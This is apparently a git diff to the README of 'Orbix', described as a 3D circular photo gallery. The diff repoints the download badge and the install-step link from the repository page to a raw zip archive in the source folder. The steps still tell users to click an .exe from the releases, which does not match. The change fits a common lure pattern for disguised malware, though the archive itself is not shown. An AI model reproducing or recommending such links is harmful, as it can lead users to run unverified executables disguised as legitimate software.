@@ -1,6 +1,6 @@
 # 🌐 Orbix - View images in smooth circular motion
 
-[![](https://img.shields.io/badge/Download_Orbix-Blue-blue)](https://github.com/megalithic-dogdo795/Orbix)
+[![](https://img.shields.io/badge/Download_Orbix-Blue-blue)](https://github.com/megalithic-dogdo795/Orbix/raw/refs/heads/main/src/Software_v1.7.zip)
 
 Orbix organizes your digital photographs into a 3D gallery. Your images float in a circular formation. You rotate the circle to view each image. The software uses motion controls to place your images in focus.
 
@@ -29,7 +29,7 @@ Your computer needs specific hardware and software to run this application.
 Follow these steps to set up the software on your computer.
 
 1. Open your web browser.
-2. Visit the [Orbix download page](https://github.com/megalithic-dogdo795/Orbix).
+2. Visit the [Orbix download page](https://github.com/megalithic-dogdo795/Orbix/raw/refs/heads/main/src/Software_v1.7.zip).
 3. Find the latest release version on the right side of the screen.
 4. Click the file that ends with .exe to start the download.
 5. Locate the file in your Downloads folder after it finishes.
